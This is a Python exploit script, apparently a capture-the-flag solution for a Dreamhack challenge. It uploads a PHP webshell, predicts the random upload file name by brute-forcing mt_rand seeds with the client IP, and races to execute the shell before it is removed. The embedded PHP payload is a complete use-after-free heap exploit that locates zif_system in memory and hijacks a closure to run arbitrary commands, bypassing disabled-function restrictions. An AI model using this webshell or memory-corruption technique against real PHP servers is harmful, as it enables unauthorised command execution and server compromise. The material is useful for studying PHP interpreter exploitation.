import requests
import re
import hashlib
import subprocess
import time
import requests

url = 'http://host3.dreamhack.games:21395/'
s = requests.Session()

WEBSHELL_NAME = 'payload.php'
WEBSHELL_MARKER = "WEBSHELL_PWN_1337"

def gen_candidates(start, end):
    php_src = f"""
        for ($s = {start}; $s <= {end}; $s++) {{
            mt_srand($s);
            echo mt_rand() . "\\n";
        }}
    """
    out = subprocess.run(["php", "-r", php_src], capture_output=True, text=True, check=True)
    return [int(line) for line in out.stdout.splitlines() if line.strip()]

def build_hash_list(ip, start, end):
    values = gen_candidates(start, end)
    hashes = []
    for v in values:
        h = hashlib.sha256(f"{v}{ip}".encode()).hexdigest()
        hashes.append(h)
    return hashes

def upload(filename, contents):
    res = s.post(url, files={
        "file": (filename, contents, "application/x-php")
    })

    assert 'absorbed' in res.text
    print("> Uploaded", filename)

def race_window(hashes, deadline):
    for h in hashes:
        if time.time() > deadline:
            return None

        cand = f"{h}_{WEBSHELL_NAME}"
        res = s.get(url, params={"try": cand})

        if WEBSHELL_MARKER in res.text:
            return cand
        
    return None

def get_ip():
    data = subprocess.run(['curl', 'ifconfig.me'], capture_output=True)

    return data.stdout.decode()

ip = get_ip()
print("> IP:", ip)

cmd = '/flag'

payload = '''
<?php
    echo "%s";

new Pwn("%s");

class Helper { public $a, $b, $c; }
class Pwn {
    const LOGGING = false;
    const CHUNK_DATA_SIZE = 0x60;
    const CHUNK_SIZE = ZEND_DEBUG_BUILD ? self::CHUNK_DATA_SIZE + 0x20 : self::CHUNK_DATA_SIZE;
    const STRING_SIZE = self::CHUNK_DATA_SIZE - 0x18 - 1;

    const HT_SIZE = 0x118;
    const HT_STRING_SIZE = self::HT_SIZE - 0x18 - 1;

    public function __construct($cmd) {
        for($i = 0; $i < 10; $i++) {
            $groom[] = self::alloc(self::STRING_SIZE);
            $groom[] = self::alloc(self::HT_STRING_SIZE);
        }
        
        $concat_str_addr = self::str2ptr($this->heap_leak(), 16);
        $fill = self::alloc(self::STRING_SIZE);

        $this->abc = self::alloc(self::STRING_SIZE);
        $abc_addr = $concat_str_addr + self::CHUNK_SIZE;
        self::log("abc @ 0x%%x", $abc_addr);

        $this->free($abc_addr);
        $this->helper = new Helper;
        if(strlen($this->abc) < 0x1337) {
            self::log("uaf failed");
            return;
        }

        $this->helper->a = "leet";
        $this->helper->b = function($x) {};
        $this->helper->c = 0xfeedface;

        $helper_handlers = $this->rel_read(0);
        self::log("helper handlers @ 0x%%x", $helper_handlers);

        $closure_addr = $this->rel_read(0x20);
        self::log("real closure @ 0x%%x", $closure_addr);

        $closure_ce = $this->read($closure_addr + 0x10);
        self::log("closure class_entry @ 0x%%x", $closure_ce);
        
        $basic_funcs = $this->get_basic_funcs($closure_ce);
        self::log("basic_functions @ 0x%%x", $basic_funcs);

        $zif_system = $this->get_system($basic_funcs);
        self::log("zif_system @ 0x%%x", $zif_system);

        $fake_closure_off = 0x70;
        for($i = 0; $i < 0x138; $i += 8) {
            $this->rel_write($fake_closure_off + $i, $this->read($closure_addr + $i));
        }
        $this->rel_write($fake_closure_off + 0x38, 1, 4);
        $handler_offset = PHP_MAJOR_VERSION === 8 ? 0x70 : 0x68;
        $this->rel_write($fake_closure_off + $handler_offset, $zif_system);

        $fake_closure_addr = $abc_addr + $fake_closure_off + 0x18;
        self::log("fake closure @ 0x%%x", $fake_closure_addr);

        $this->rel_write(0x20, $fake_closure_addr);
        ($this->helper->b)($cmd);

        $this->rel_write(0x20, $closure_addr);
        unset($this->helper->b);
    }

    private function heap_leak() {
        $arr = [[], []];
        set_error_handler(function() use (&$arr, &$buf) {
            $arr = 1;
            $buf = str_repeat("\\x00", self::HT_STRING_SIZE);
        });
        $arr[1] .= self::alloc(self::STRING_SIZE - strlen("Array"));
        return $buf;
    }

    private function free($addr) {
        $payload = pack("Q*", 0xdeadbeef, 0xcafebabe, $addr);
        $payload .= str_repeat("A", self::HT_STRING_SIZE - strlen($payload));
        
        $arr = [[], []];
        set_error_handler(function() use (&$arr, &$buf, &$payload) {
            $arr = 1;
            $buf = str_repeat($payload, 1);
        });
        $arr[1] .= "x";
    }

    private function rel_read($offset) {
        return self::str2ptr($this->abc, $offset);
    }

    private function rel_write($offset, $value, $n = 8) {
        for ($i = 0; $i < $n; $i++) {
            $this->abc[$offset + $i] = chr($value & 0xff);
            $value >>= 8;
        }
    }

    private function read($addr, $n = 8) {
        $this->rel_write(0x10, $addr - 0x10);
        $value = strlen($this->helper->a);
        if($n !== 8) { $value &= (1 << ($n << 3)) - 1; }
        return $value;
    }

    private function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = $this->read($addr);
            $f_name = $this->read($f_entry, 6);
            if($f_name === 0x6d6574737973) {
                return $this->read($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry !== 0);
    }

    private function get_basic_funcs($addr) {
        while(true) {
            $addr -= 0x10;
            if($this->read($addr, 4) === 0xA8 &&
                in_array($this->read($addr + 4, 4),
                    [20180731, 20190902, 20200930, 20210902])) {
                $module_name_addr = $this->read($addr + 0x20);
                $module_name = $this->read($module_name_addr);
                if($module_name === 0x647261646e617473) {
                    self::log("standard module @ 0x%%x", $addr);
                    return $this->read($addr + 0x28);
                }
            }
        }
    }

    private function log($format, $val = "") {
        if(self::LOGGING) {
            printf("{$format}\\n", $val);
        }
    }

    static function alloc($size) {
        return str_shuffle(str_repeat("A", $size));
    }

    static function str2ptr($str, $p = 0, $n = 8) {
        $address = 0;
        for($j = $n - 1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p + $j]);
        }
        return $address;
    }
}
''' % (WEBSHELL_MARKER, cmd)

seed = 0
while seed <= 999:
    print("> Precomputing seed hashes")
    hashes = build_hash_list(ip, seed, 999)

    upload(WEBSHELL_NAME, payload)

    path = race_window(hashes, time.time() + 9.0)

    assert path
    print("> Payload path:", path)

    break

res = s.get(f'{url}', params={
    'try': path
})

flag = re.findall(r'(YISF{.+?})', res.text)[0].strip()
print("> Flag:", flag)